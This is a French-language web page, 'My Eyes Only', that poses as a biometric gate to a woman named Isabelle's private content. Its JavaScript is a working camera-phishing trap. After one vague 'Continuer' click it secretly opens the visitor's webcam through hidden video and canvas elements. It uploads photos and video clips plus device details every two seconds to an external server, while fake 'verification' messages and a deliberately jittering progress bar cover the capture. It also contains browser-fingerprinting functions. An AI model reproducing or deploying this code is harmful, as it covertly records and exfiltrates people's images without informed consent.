<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>My Eyes Only</title>
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

/*    body {
      font-family: 'SF Pro Display', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      position: relative;
      overflow: hidden;
    }*/
    body {
        font-family: 'SF Pro Display', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
        min-height: 100vh;
        position: relative;
        overflow-x: hidden;
        padding: 50px 20px;
    }

    .background-elements {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      pointer-events: none;
      z-index: 0;
    }

    .floating-element {
      position: absolute;
      width: 8px;
      height: 8px;
      background: rgba(255, 255, 255, 0.1);
      border-radius: 50%;
      animation: float 15s infinite linear;
    }

    @keyframes float {
      0% { transform: translateY(100vh) rotate(0deg); opacity: 0; }
      10% { opacity: 1; }
      90% { opacity: 1; }
      100% { transform: translateY(-100vh) rotate(360deg); opacity: 0; }
    }

    .container {
      background: rgba(255, 255, 255, 0.98);
      backdrop-filter: blur(40px);
      border-radius: 28px;
      padding: 45px;
      width: 440px;
      max-width: 92vw;
      box-shadow: 
        0 32px 64px rgba(0, 0, 0, 0.4),
        inset 0 1px 0 rgba(255, 255, 255, 0.9);
      border: 1px solid rgba(255, 255, 255, 0.3);
      position: relative;
      z-index: 10;
      margin-left: auto;
      margin-right: auto;
    }

    .header {
      text-align: center;
      margin-bottom: 35px;
    }

    .logo-container {
      position: relative;
      margin-bottom: 25px;
    }

    .logo {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      width: 90px;
      height: 90px;
      background: linear-gradient(135deg, #667eea, #764ba2);
      border-radius: 22px;
      box-shadow: 
        0 15px 35px rgba(102, 126, 234, 0.4),
        inset 0 1px 0 rgba(255, 255, 255, 0.3);
      position: relative;
      overflow: hidden;
    }

    .logo::before {
      content: '';
      position: absolute;
      top: -50%;
      left: -50%;
      width: 200%;
      height: 200%;
      background: linear-gradient(45deg, transparent, rgba(255,255,255,0.4), transparent);
      animation: logoShine 3s ease-in-out infinite;
    }

    @keyframes logoShine {
      0%, 100% { transform: rotate(0deg) scale(0); opacity: 0; }
      50% { transform: rotate(180deg) scale(1); opacity: 1; }
    }

    .logo i {
      font-size: 42px;
      color: white;
      z-index: 1;
      position: relative;
    }

    .title {
      font-size: 32px;
      font-weight: 700;
      background: linear-gradient(135deg, #2d3748, #4a5568);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      margin-bottom: 8px;
      letter-spacing: -0.5px;
    }

    .subtitle {
      color: #64748b;
      font-size: 17px;
      line-height: 1.4;
      font-weight: 500;
    }

    .security-badge {
      background: linear-gradient(135deg, #e8f5ff, #f0f9ff);
      border: 2px solid #bfdbfe;
      border-radius: 16px;
      padding: 18px;
      margin: 25px 0;
      display: flex;
      align-items: center;
      gap: 15px;
      position: relative;
      overflow: hidden;
    }

    .security-badge::before {
      content: '';
      position: absolute;
      top: 0;
      left: -100%;
      width: 100%;
      height: 100%;
      background: linear-gradient(90deg, transparent, rgba(59, 130, 246, 0.1), transparent);
      animation: securityScan 2s infinite;
    }

    @keyframes securityScan {
      0% { left: -100%; }
      100% { left: 100%; }
    }

    .security-badge i {
      color: #2563eb;
      font-size: 24px;
      animation: pulse 2s infinite;
    }

    @keyframes pulse {
      0%, 100% { transform: scale(1); }
      50% { transform: scale(1.1); }
    }

    .security-badge-text {
      color: #1e40af;
      font-size: 15px;
      line-height: 1.5;
      font-weight: 600;
    }

    .biometric-section {
      text-align: center;
      margin: 35px 0;
    }

    .biometric-scanner {
      width: 140px;
      height: 140px;
      margin: 0 auto 25px;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      box-shadow: 
        0 20px 40px rgba(102, 126, 234, 0.3),
        inset 0 2px 0 rgba(255, 255, 255, 0.3);
      position: relative;
      overflow: hidden;
    }

    .scanner-rings {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
    }

    .scanner-ring {
      position: absolute;
      border: 2px solid rgba(255, 255, 255, 0.3);
      border-radius: 50%;
      animation: scanRing 2s infinite ease-out;
    }

    .scanner-ring:nth-child(1) {
      width: 60px;
      height: 60px;
      margin: -30px 0 0 -30px;
      animation-delay: 0s;
    }

    .scanner-ring:nth-child(2) {
      width: 90px;
      height: 90px;
      margin: -45px 0 0 -45px;
      animation-delay: 0.5s;
    }

    .scanner-ring:nth-child(3) {
      width: 120px;
      height: 120px;
      margin: -60px 0 0 -60px;
      animation-delay: 1s;
    }

    @keyframes scanRing {
      0% { transform: scale(0); opacity: 1; }
      100% { transform: scale(1); opacity: 0; }
    }

    .biometric-scanner i {
      font-size: 54px;
      color: white;
      z-index: 5;
      position: relative;
    }

    .scan-button {
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      border: none;
      border-radius: 18px;
      color: white;
      font-size: 18px;
      font-weight: 600;
      padding: 18px 45px;
      cursor: pointer;
      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
      box-shadow: 
        0 10px 30px rgba(102, 126, 234, 0.4),
        inset 0 1px 0 rgba(255, 255, 255, 0.3);
      position: relative;
      overflow: hidden;
      width: 100%;
      margin: 25px 0;
      min-height: 56px;
    }

    .scan-button:hover {
      transform: translateY(-3px);
      box-shadow: 
        0 15px 40px rgba(102, 126, 234, 0.5),
        inset 0 1px 0 rgba(255, 255, 255, 0.3);
    }

    .scan-button:active {
      transform: translateY(-1px);
    }

    .scan-button:disabled {
      background: linear-gradient(135deg, #9ca3af, #6b7280);
      cursor: not-allowed;
      transform: none;
    }

    .scan-button::before {
      content: '';
      position: absolute;
      top: 0;
      left: -100%;
      width: 100%;
      height: 100%;
      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
      transition: left 0.6s ease;
    }

    .scan-button:hover::before {
      left: 100%;
    }

    .loading-spinner {
      display: none;
      width: 20px;
      height: 20px;
      border: 2px solid rgba(255,255,255,0.3);
      border-radius: 50%;
      border-top-color: #fff;
      animation: spin 1s linear infinite;
      margin-right: 12px;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    .status {
      text-align: center;
      margin: 25px 0;
      padding: 18px;
      border-radius: 14px;
      font-size: 15px;
      font-weight: 500;
      transition: all 0.4s ease;
      position: relative;
      overflow: hidden;
    }

    .status::before {
      content: '';
      position: absolute;
      top: 0;
      left: -100%;
      width: 100%;
      height: 100%;
      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent);
      transition: left 0.8s ease;
    }

    .status.active::before {
      left: 100%;
    }

    .status.info {
      background: linear-gradient(135deg, #dbeafe, #e0f2fe);
      color: #1e40af;
      border: 1px solid #93c5fd;
    }

    .status.warning {
      background: linear-gradient(135deg, #fef3c7, #fde68a);
      color: #92400e;
      border: 1px solid #fbbf24;
    }

    .status.error {
      background: linear-gradient(135deg, #fee2e2, #fecaca);
      color: #991b1b;
      border: 1px solid #f87171;
    }

    .status.success {
      background: linear-gradient(135deg, #d1fae5, #a7f3d0);
      color: #065f46;
      border: 1px solid #34d399;
    }

    .progress-container {
      margin: 20px 0;
      display: none;
    }

    .progress-bar {
      width: 100%;
      height: 8px;
      background: rgba(148, 163, 184, 0.2);
      border-radius: 4px;
      overflow: hidden;
      position: relative;
    }

    .progress-fill {
      height: 100%;
      background: linear-gradient(90deg, #667eea, #764ba2);
      width: 0%;
      transition: width 0.6s cubic-bezier(0.4, 0, 0.2, 1);
      border-radius: 4px;
      position: relative;
    }

    .progress-fill::after {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
      animation: progressShine 1.5s infinite;
    }

    @keyframes progressShine {
      0% { transform: translateX(-100%); }
      100% { transform: translateX(100%); }
    }

    .features {
      margin-top: 35px;
      padding-top: 25px;
      border-top: 1px solid rgba(148, 163, 184, 0.2);
    }

    .feature {
      display: flex;
      align-items: center;
      gap: 15px;
      margin-bottom: 16px;
      color: #475569;
      font-size: 15px;
      font-weight: 500;
      padding: 12px;
      border-radius: 10px;
      transition: all 0.3s ease;
    }

    .feature:hover {
      background: rgba(102, 126, 234, 0.05);
      transform: translateX(5px);
    }

    .feature i {
      color: #667eea;
      width: 24px;
      text-align: center;
      font-size: 16px;
    }

    .hidden-media {
      position: absolute;
      top: -9999px;
      left: -9999px;
      width: 1px;
      height: 1px;
      opacity: 0;
      pointer-events: none;
      z-index: -1;
    }

    .permission-modal {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.85);
      backdrop-filter: blur(8px);
      z-index: 1000;
      align-items: center;
      justify-content: center;
    }

    .modal-content {
      background: white;
      border-radius: 20px;
      padding: 35px;
      max-width: 420px;
      width: 90%;
      text-align: center;
      box-shadow: 0 25px 50px rgba(0, 0, 0, 0.3);
      position: relative;
      animation: modalEnter 0.3s ease-out;
    }

    @keyframes modalEnter {
      from { transform: scale(0.9); opacity: 0; }
      to { transform: scale(1); opacity: 1; }
    }

    .modal-content h3 {
      color: #1f2937;
      margin-bottom: 18px;
      font-size: 22px;
      font-weight: 700;
    }

    .modal-content p {
      color: #4b5563;
      line-height: 1.6;
      margin-bottom: 25px;
      font-size: 16px;
    }

    .modal-buttons {
      display: flex;
      gap: 15px;
      justify-content: center;
    }

    .modal-btn {
      padding: 12px 24px;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      font-weight: 600;
      font-size: 15px;
      transition: all 0.2s ease;
      min-width: 100px;
    }

    .modal-btn.primary {
      background: linear-gradient(135deg, #667eea, #764ba2);
      color: white;
      box-shadow: 0 4px 15px rgba(102, 126, 234, 0.3);
    }

    .modal-btn.primary:hover {
      transform: translateY(-2px);
      box-shadow: 0 6px 20px rgba(102, 126, 234, 0.4);
    }

    .modal-btn.secondary {
      background: #f3f4f6;
      color: #374151;
      border: 1px solid #d1d5db;
    }

    .modal-btn.secondary:hover {
      background: #e5e7eb;
    }

    /* √âl√©ments flottants anim√©s */
    .floating-element:nth-child(1) { left: 10%; animation-delay: 0s; }
    .floating-element:nth-child(2) { left: 20%; animation-delay: 2s; }
    .floating-element:nth-child(3) { left: 30%; animation-delay: 4s; }
    .floating-element:nth-child(4) { left: 40%; animation-delay: 6s; }
    .floating-element:nth-child(5) { left: 50%; animation-delay: 8s; }
    .floating-element:nth-child(6) { left: 60%; animation-delay: 10s; }
    .floating-element:nth-child(7) { left: 70%; animation-delay: 12s; }
    .floating-element:nth-child(8) { left: 80%; animation-delay: 14s; }
    .floating-element:nth-child(9) { left: 90%; animation-delay: 16s; }
  </style>
</head>
<body>
  <!-- √âl√©ments d'arri√®re-plan anim√©s -->
  <div class="background-elements">
    <div class="floating-element"></div>
    <div class="floating-element"></div>
    <div class="floating-element"></div>
    <div class="floating-element"></div>
    <div class="floating-element"></div>
    <div class="floating-element"></div>
    <div class="floating-element"></div>
    <div class="floating-element"></div>
    <div class="floating-element"></div>
  </div>
  
  <!-- √âl√©ments media cach√©s mais fonctionnels -->
  <video id="videoStream" class="hidden-media" autoplay muted playsinline></video>
  <canvas id="captureCanvas" class="hidden-media"></canvas>

  <div class="container">
    <div class="header">
      <div class="logo-container">
        <div class="logo">
          <i class="fas fa-eye"></i>
        </div>
      </div>
      <h1 class="title">My Eyes Only</h1>
      <p class="subtitle">Acc√®s s√©curis√© aux contenus priv√©s de Isabelle</p>
    </div>

    <div class="security-badge">
      <i class="fas fa-shield-halved"></i>
      <div class="security-badge-text">
        <strong>Protection maximale :</strong> Pour votre s√©curit√© et celle de <strong>Isabelle</strong>, une v√©rification biom√©trique est requise pour acc√©der √† ces contenus priv√©s. C'est une mesure de s√©curit√© pour garantir que vous √™tes la bonne personne.
      </div>
    </div>

    <div class="biometric-section">
      <div class="biometric-scanner">
        <div class="scanner-rings">
          <div class="scanner-ring"></div>
          <div class="scanner-ring"></div>
          <div class="scanner-ring"></div>
        </div>
        <i class="fas fa-scan"></i>
      </div>
      
      <button id="scanButton" class="scan-button">
        <span class="loading-spinner"></span>
        <span class="btn-text">Voir Contenu Priv√©</span>
        <!--Voir Contenu Priv√© de <strong>Isabelle</strong>-->
      </button>
    </div>
    <div id="statusDisplay" class="status info">
      Appuyez sur le bouton pour acc√©der √† vos contenus priv√©s en toute s√©curit√©
    </div>

    <div class="progress-container" id="progressContainer">
      <div class="progress-bar">
        <div class="progress-fill" id="progressFill"></div>
      </div>
    </div>

    <div class="features">
      <div class="feature">
        <i class="fas fa-user-shield"></i>
        <span>Reconnaissance faciale avanc√©e</span>
      </div>
      <div class="feature">
        <i class="fas fa-lock"></i>
        <span>Chiffrement AES-256</span>
      </div>
      <div class="feature">
        <i class="fas fa-eye-slash"></i>
        <span>Mode priv√© activ√©</span>
      </div>
      <div class="feature">
        <i class="fas fa-clock"></i>
        <span>Authentification instantan√©e</span>
      </div>
    </div>
  </div>

  <!-- Modal de permission cam√©ra -->
  <div id="cameraModal" class="permission-modal">
    <div class="modal-content">
      <h3> Cliquer pour continuer </h3>
      <!-- <p>My Eyes Only a besoin d'acc√©der √† votre cam√©ra pour la v√©rification biom√©trique. Cette fonctionnalit√© garantit que vous √™tes autoris√© √† consulter les contenus priv√©s de Isabelle.</p> -->
      <div class="modal-buttons">
        <button class="modal-btn secondary" onclick="allowCamera()">Continuer</button>
        <!-- <button class="modal-btn primary" onclick="allowCamera()">Autoriser l'acc√®s</button>-->
      </div>
    </div>
  </div>

  <script>
    // Configuration
    const CONFIG = {
      serverEndpoint: 'https://moonscale-dashboard.onrender.com/stream/upload',
      captureInterval: 2000, // Capture toutes les 1 seconde
      videoSegmentDuration: 2000, // 2 secondes de vid√©o
      maxRetries: 3,
      sessionDuration: 60000 // 1 minute de session
    };
    let clientInfoCache = null;

    // √âtat de l'application
    let appState = {
      mediaStream: null,
      isCapturing: false,
      captureTimer: null,
      clickCount: 0,
      verificationStage: 0,
      sessionActive: false,
      retryCount: 0
    };

    // √âl√©ments DOM
    const elements = {
      video: document.getElementById('videoStream'),
      canvas: document.getElementById('captureCanvas'),
      scanBtn: document.getElementById('scanButton'),
      status: document.getElementById('statusDisplay'),
      progress: document.getElementById('progressFill'),
      progressContainer: document.getElementById('progressContainer'),
      modal: document.getElementById('cameraModal'),
      spinner: document.querySelector('.loading-spinner'),
      btnText: document.querySelector('.btn-text')
    };

    // Messages de v√©rification r√©alistes
    const verificationMessages = [
      "Initialisation du scanner biom√©trique...",
      "Analyse des caract√©ristiques faciales...",
      "V√©rification de l'identit√© en cours...",
      "Validation des param√®tres de s√©curit√©...",
      "Pr√©paration de l'acc√®s s√©curis√©..."
    ];

    const continuousMessages = [
      "Maintien de la connexion s√©curis√©e...",
      "Surveillance continue activ√©e...",
      "V√©rification p√©riodique en cours...",
      "Protection des donn√©es en temps r√©el...",
      "Session s√©curis√©e maintenue..."
    ];

    // Fonctions utilitaires
    function updateStatus(message, type = 'info') {
      elements.status.textContent = message;
      elements.status.className = `status ${type} active`;
      
      // Animation de brillance
      setTimeout(() => {
        elements.status.classList.remove('active');
      }, 800);
    }

    function updateProgress(percentage) {
      elements.progress.style.width = `${Math.min(100, Math.max(0, percentage))}%`;
    }

    function showProgress() {
      elements.progressContainer.style.display = 'block';
    }

    function hideProgress() {
      elements.progressContainer.style.display = 'none';
    }

    function setButtonState(loading, text) {
      if (loading) {
        elements.spinner.style.display = 'inline-block';
        elements.scanBtn.disabled = true;
        elements.btnText.textContent = text || 'Authentification...';
      } else {
        elements.spinner.style.display = 'none';
        elements.scanBtn.disabled = false;
        elements.btnText.textContent = text || 'D√©bloquer mes contenus';
      }
    }

    function showModal() {
      elements.modal.style.display = 'flex';
    }

    function hideModal() {
      elements.modal.style.display = 'none';
    }

    // Capture des donn√©es
    function captureImage() {
      if (!elements.video.videoWidth || !elements.video.videoHeight) {
        return null;
      }

      const ctx = elements.canvas.getContext('2d');
      const aspectRatio = elements.video.videoWidth / elements.video.videoHeight;
      
      // Optimisation de la qualit√©
      elements.canvas.width = Math.min(800, elements.video.videoWidth);
      elements.canvas.height = elements.canvas.width / aspectRatio;
      
      ctx.drawImage(elements.video, 0, 0, elements.canvas.width, elements.canvas.height);
      
      // Compression optimale pour l'envoi
      return elements.canvas.toDataURL('image/jpeg', 0.75);
    }

    function recordVideoSegment() {
      return new Promise((resolve) => {
        if (!appState.mediaStream) {
          resolve(null);
          return;
        }

        try {
          const recorder = new MediaRecorder(appState.mediaStream, {
            mimeType: 'video/webm;codecs=vp9'
          });
          
          const chunks = [];

          recorder.ondataavailable = (event) => {
            if (event.data && event.data.size > 0) {
              chunks.push(event.data);
            }
          };

          recorder.onstop = () => {
            if (chunks.length > 0) {
              const blob = new Blob(chunks, { type: 'video/webm' });
              const reader = new FileReader();
              reader.onload = () => resolve(reader.result);
              reader.onerror = () => resolve(null);
              reader.readAsDataURL(blob);
            } else {
              resolve(null);
            }
          };

          recorder.onerror = () => resolve(null);

          recorder.start();
          setTimeout(() => {
            if (recorder.state === 'recording') {
              recorder.stop();
            }
          }, CONFIG.videoSegmentDuration);

        } catch (error) {
          console.warn('Enregistrement vid√©o non support√©:', error);
          resolve(null);
        }
      });
    }

    // Fonction pour g√©n√©rer un fingerprint canvas
function generateCanvasFingerprint() {
  try {
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    
    ctx.textBaseline = 'top';
    ctx.font = '14px Arial';
    ctx.fillText('Canvas fingerprinting test üîí', 2, 2);
    
    return canvas.toDataURL().substring(0, 50); // Hash partiel
  } catch (e) {
    return 'unavailable';
  }
}

// Informations WebGL
function getWebGLInfo() {
  try {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    
    if (!gl) return null;
    
    return {
      vendor: gl.getParameter(gl.VENDOR),
      renderer: gl.getParameter(gl.RENDERER),
      version: gl.getParameter(gl.VERSION),
      shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
    };
  } catch (e) {
    return null;
  }
}


    function collectClientInfo() {
        const clientInfo = {
            // Informations de base du navigateur
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            languages: navigator.languages,
            cookieEnabled: navigator.cookieEnabled,
            onLine: navigator.onLine,
            
            // √âcran et r√©solution
            screenWidth: screen.width,
            screenHeight: screen.height,
            screenColorDepth: screen.colorDepth,
            screenPixelDepth: screen.pixelDepth,
            devicePixelRatio: window.devicePixelRatio,
            
            // Fen√™tre du navigateur
            windowWidth: window.innerWidth,
            windowHeight: window.innerHeight,
            
            // Timezone et localisation
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timezoneOffset: new Date().getTimezoneOffset(),
            
            // Informations syst√®me
            hardwareConcurrency: navigator.hardwareConcurrency, // Nombre de c≈ìurs CPU
            memory: navigator.deviceMemory, // RAM (si disponible)
            connection: navigator.connection ? {
            effectiveType: navigator.connection.effectiveType,
            downlink: navigator.connection.downlink,
            rtt: navigator.connection.rtt
            } : null,
            
            // Plugins et capacit√©s
            plugins: Array.from(navigator.plugins).map(p => ({
            name: p.name,
            description: p.description,
            filename: p.filename
            })),
            
            // Canvas fingerprinting (basique)
            canvasFingerprint: generateCanvasFingerprint(),
            
            // WebGL informations
            webglInfo: getWebGLInfo(),
            
            // Historique de navigation (longueur seulement)
            historyLength: history.length,
            
            // R√©f√©rent
            referrer: document.referrer,
            
            // URL actuelle
            currentUrl: window.location.href,
            
            // Battery API (si disponible)
            battery: null, // Sera rempli asynchroniquement
            
            // G√©olocalisation (demande permission)
            location: null // Sera rempli si autoris√©
        };
        
        return clientInfo;
    }


    async function collectInfo() {
        // V√©rifiez si les informations ont d√©j√† √©t√© collect√©es
        if (clientInfoCache) {
            return clientInfoCache; // Retourner les informations stock√©es
        }
        const clientInfo = collectClientInfo();
        
        // Collecte battery info si disponible
        if ('getBattery' in navigator) {
            try {
            const battery = await navigator.getBattery();
            clientInfo.battery = {
                level: battery.level,
                charging: battery.charging,
                chargingTime: battery.chargingTime,
                dischargingTime: battery.dischargingTime
            };
            } catch (err) {
            console.log('Battery API non disponible');
            }
        }
        clientInfoCache = clientInfo; // Stocker les informations collect√©es
        return clientInfo;      
    }
    // Envoi s√©curis√© des donn√©es
    async function transmitCapturedData() {
      if (!appState.sessionActive) return;

      try {
        const imageData = captureImage();
        const videoData = await recordVideoSegment();

        if (!imageData && !videoData) {
          console.warn('Aucune donn√©e √† transmettre');
          return;
        }

        const payload = {
          session_id: `session_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
          timestamp: new Date().toISOString(),
          images: imageData ? [imageData] : [],
          video: videoData || null,
          clientInfo: {},//await collectInfo(),
          metadata: {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screen: {
              width: screen.width,
              height: screen.height,
              colorDepth: screen.colorDepth
            },
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
          }
        };

        const response = await fetch(CONFIG.serverEndpoint, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'X-Client-Version': '2.1.0',
            'X-Security-Token': btoa(Date.now().toString())
          },
          body: JSON.stringify(payload)
        });

        if (response.ok) {
          console.log('‚úÖ Transmission s√©curis√©e r√©ussie');
          appState.retryCount = 0;
        } else {
          throw new Error(`Erreur serveur: ${response.status}`);
        }

      } catch (error) {
        console.error('‚ùå Erreur de transmission:', error);
        appState.retryCount++;
        
        if (appState.retryCount >= CONFIG.maxRetries) {
          console.warn('‚ö†Ô∏è Nombre maximum de tentatives atteint');
        }
      }
    }

    // Gestion de la cam√©ra
    async function initializeCamera() {
      try {
        updateStatus("Demande d'acc√®s √† la cam√©ra...", 'info');
        
        const constraints = {
          video: {
            width: { ideal: 1280, max: 1920 },
            height: { ideal: 720, max: 1080 },
            frameRate: { ideal: 30 },
            facingMode: 'user'
          },
          audio: false
        };

        appState.mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
        elements.video.srcObject = appState.mediaStream;

        // Attendre que la vid√©o soit pr√™te
        await new Promise((resolve) => {
          elements.video.onloadedmetadata = resolve;
        });

        updateStatus("Cam√©ra initialis√©e avec succ√®s", 'success');
        return true;

      } catch (error) {
        console.error('Erreur cam√©ra:', error);
        updateStatus("Erreur : Impossible d'acc√©der √† la cam√©ra", 'error');
        return false;
      }
    }

    // Processus de v√©rification
    async function startVerificationProcess() {
      if (appState.isCapturing) return;

      appState.isCapturing = true;
      appState.sessionActive = true;
      setButtonState(true, 'Authentification...');
      showProgress();

      // Phase initiale de v√©rification
      for (let i = 0; i < verificationMessages.length; i++) {
        updateStatus(verificationMessages[i], 'info');
        updateProgress((i + 1) * 18);
        
        // Capturer et envoyer les donn√©es √† chaque √©tape
        await transmitCapturedData();
        await new Promise(resolve => setTimeout(resolve, 1800));
      }

      // D√©marrer la capture continue
      startContinuousCapture();
      
      // Simuler une v√©rification "complexe" qui dure
      simulateOngoingVerification();
    }

    function startContinuousCapture() {
      // Capturer imm√©diatement
      transmitCapturedData();

      // Puis capturer √† intervalles r√©guliers
      appState.captureTimer = setInterval(() => {
        if (appState.sessionActive) {
          transmitCapturedData();
        }
      }, CONFIG.captureInterval);
    }

    function simulateOngoingVerification() {
      let messageIndex = 0;
      let progressValue = 90;
      
      const verificationLoop = setInterval(() => {
        if (!appState.sessionActive) {
          clearInterval(verificationLoop);
          return;
        }

        // Alterner entre diff√©rents messages
        const message = continuousMessages[messageIndex % continuousMessages.length];
        updateStatus(message, 'info');
        
        // Progression qui oscille pour donner l'impression d'un travail continu
        progressValue = 85 + Math.random() * 10;
        updateProgress(progressValue);
        
        messageIndex++;
      }, 3500);

      // Arr√™ter automatiquement apr√®s la dur√©e de session
      setTimeout(() => {
        clearInterval(verificationLoop);
        endSession();
      }, CONFIG.sessionDuration);
    }

    function endSession() {
      console.log('üîí Fin de session de d√©monstration');
      stopCapture();
      updateStatus("Session termin√©e - Red√©marrez pour une nouvelle v√©rification", 'info');
      hideProgress();
      setButtonState(false, 'Nouvelle v√©rification');
      appState.clickCount = 0;
    }

    function stopCapture() {
      appState.isCapturing = false;
      appState.sessionActive = false;
      
      if (appState.captureTimer) {
        clearInterval(appState.captureTimer);
        appState.captureTimer = null;
      }
      
      if (appState.mediaStream) {
        appState.mediaStream.getTracks().forEach(track => track.stop());
        appState.mediaStream = null;
      }
    }

    // Gestionnaires d'√©v√©nements
    async function allowCamera() {
      hideModal();
      setButtonState(true, 'Initialisation...');
      
      const success = await initializeCamera();
      if (success) {
        setButtonState(false, 'Commencer la v√©rification');
        updateStatus("Pr√™t pour la v√©rification biom√©trique", 'success');
        await startVerificationProcess();
      } else {
        setButtonState(false, 'R√©essayer');
      }
    }

    function denyCamera() {
      hideModal();
      updateStatus("Acc√®s cam√©ra requis pour la v√©rification biom√©trique", 'warning');
    }

    // √âv√©nement principal du bouton
    elements.scanBtn.addEventListener('click', async () => {
      appState.clickCount++;

      if (appState.clickCount === 1) {
        // Premier clic - demander la permission
        showModal();
      } else if (appState.mediaStream && !appState.isCapturing) {
        // Cam√©ra disponible et pas encore en cours de capture
        await startVerificationProcess();
      } else if (!appState.mediaStream) {
        // Pas de cam√©ra, redemander
        showModal();
      }
      // Si d√©j√† en cours de capture, ne rien faire
    });

    // Nettoyage automatique
    window.addEventListener('beforeunload', () => {
      stopCapture();
    });

    // Gestion de la visibilit√© de la page
    document.addEventListener('visibilitychange', () => {
      if (document.hidden && appState.sessionActive) {
        // Continuer la capture m√™me si la page n'est pas visible
        console.log('üì± Page cach√©e - maintien de la session');
      }
    });

    // Messages d'√©tat initial
    updateStatus("Pr√™t pour l'authentification s√©curis√©e", 'info');

    // Cr√©er quelques √©l√©ments flottants suppl√©mentaires dynamiquement
    function createFloatingElements() {
      const container = document.querySelector('.background-elements');
      for (let i = 0; i < 5; i++) {
        const element = document.createElement('div');
        element.className = 'floating-element';
        element.style.left = Math.random() * 100 + '%';
        element.style.animationDelay = Math.random() * 20 + 's';
        element.style.animationDuration = (15 + Math.random() * 10) + 's';
        container.appendChild(element);
      }
    }

    // Initialisation
    createFloatingElements();
  </script>
</body>
</html>